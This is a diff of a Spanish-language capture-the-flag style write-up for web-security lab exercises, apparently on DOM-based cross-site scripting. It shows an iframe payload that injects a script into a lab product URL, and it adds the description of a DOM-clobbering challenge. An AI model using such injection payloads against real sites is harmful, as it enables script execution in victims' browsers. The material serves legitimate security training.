@@ -74,3 +74,7 @@ El ataque consiste en forzar a la víctima a cargar una URL de producto con cód
 ```html
 <iframe src="https://0a6500a00473d2f780d826bc00f800ab.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a6500a00473d2f780d826bc00f800ab.web-security-academy.net';window.x=1;">
 ```
+
+## Reto 3: Explotación de la manipulación del DOM para habilitar XSS
+
+Este laboratorio contiene una vulnerabilidad de DOM-clobbering. La funcionalidad de comentarios permite HTML "seguro". Para resolver este laboratorio, construya una inyección HTML que vulnere una variable y use XSS para llamar a... alert() función. 
